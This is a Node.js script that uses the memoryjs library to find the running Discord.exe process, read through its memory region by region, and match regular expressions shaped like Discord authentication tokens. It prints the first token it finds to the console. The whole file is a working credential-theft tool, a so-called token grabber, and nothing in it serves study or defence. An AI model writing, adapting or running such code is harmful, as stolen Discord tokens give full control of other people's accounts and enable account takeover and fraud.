const { getProcesses, openProcess, virtualQueryEx, readBuffer } = require("memoryjs");

// Variables
let token = "";
let processName = "Discord.exe";

// Get all running processes
let processes = getProcesses();

// Regexes
let firstCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);
let secondCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{107}/g);
let thirdCheck = new RegExp(/Nz[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);

// More variables
let procID = 0;
let found = false;

// For loop to search for Discord.exe
for (let i = 0; i < processes.length; i++) {

    // When we find Discord.exe
    if (processes[i].szExeFile == processName) {

        // Only runs when Discord.exe hasn't been found
        if (found == false) {

            // When we find Discord save it to variable and set found to true
            console.log(`succesfully found ${processes[i].szExeFile} with pID ${processes[i].th32ProcessID}`);
            procID = processes[i].th32ProcessID;
            found = true;
        };
    };
};

// If we couldn't find Discord
if (found == false) {
    console.log(`could not find ${processName}`);
} else {
    console.log("getting process handle and base address...");

    // Open the process to get the handle and base address
    const processObject = openProcess(procID);

    console.log(`succesfully retrieved handle ${processObject.handle} and base address ${processObject.modBaseAddr}`);
    console.log("searching token in memory...");

    // Start timer
    console.time("Found token in");
    
    //Address variable
    let addr = 0;
    
    // While loop to loop trough memory
    while (true) {
        try {

            // Run a virtualquery to find sectors in the memory
            let query = virtualQueryEx(processObject.handle, addr);

            // Read the memory each time
            let string = readBuffer(processObject.handle, addr, query.RegionSize).toString();
    
            // Run the regexes on the string
            let fToken = firstCheck.exec(string);
            let sToken = secondCheck.exec(string);
            let tToken = thirdCheck.exec(string);
    
            // If the first regex succeeds
            if (fToken) {

                // Put token in variable and break look
                token = fToken[0];
                break;

            // If the second regex succeeds
            } else if (sToken) {

                // Put token in variable and break look
                token = sToken[0];
                break;

            // If the second regex succeeds
            } else if (tToken) {

                // Put token in variable and break look
                token = tToken[0];
                break;
            };
    
            // Update the address each loop
            addr = query.BaseAddress + query.RegionSize;
        } catch (err) {
            console.log("could not find token in memory");
            break;
        };
    };

    // Check if we could find the token
    if (token.length == 0) {
        console.log("could not find token in memory");
    } else {

        // Log the token and stop the timer
        console.log("token: " + token);
        console.timeEnd("Found token in");
    };
};
